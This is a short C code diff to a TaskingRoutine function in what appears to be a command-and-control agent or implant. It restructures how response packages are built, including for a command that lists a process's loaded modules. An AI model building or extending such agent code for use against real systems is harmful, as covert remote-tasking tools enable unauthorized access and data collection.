@@ -38,8 +38,7 @@ void TaskingRoutine() {
         {
             break;
         }
-    	pPackage = CreatePackage(SEND_DATA);
-        
+
 		if (Buffer.Buffer && Buffer.BufferLength > 0) { // if we successfully sent our queued packages and received a response.
 
             NewParser(&Parser, Buffer.Buffer, Buffer.BufferLength);
@@ -56,6 +55,8 @@ void TaskingRoutine() {
                     break;
 
 		        case LIST_LOADED_MODULES:
+		        	pPackage = CreateDataPackage(SEND_DATA, LIST_LOADED_MODULES);
+
 					NTSTATUS NtStatus = 0x00;
 		    		PROCESS_BASIC_INFORMATION PBI = {0};
 		    		OBJECT_ATTRIBUTES ObjAttr = {0};
@@ -128,9 +129,12 @@ void TaskingRoutine() {
         { 
 			break;
         }
-    	if(pPackage->Length > 0) {
-    		printf("[info] adding package to package list\n");
-    		AddPackageToAgentPackageList(pPackage);
+    	if(pPackage != NULL) {
+    		if(  pPackage->Length > 0) {
+    			printf("[info] adding package to package list with size of 0x%04X\n", pPackage->Length);
+    			AddInt32ToBuffer(pPackage->Buffer, pPackage->Length);
+    			AddPackageToAgentPackageList(pPackage);
+    		}
     	}
     }
 
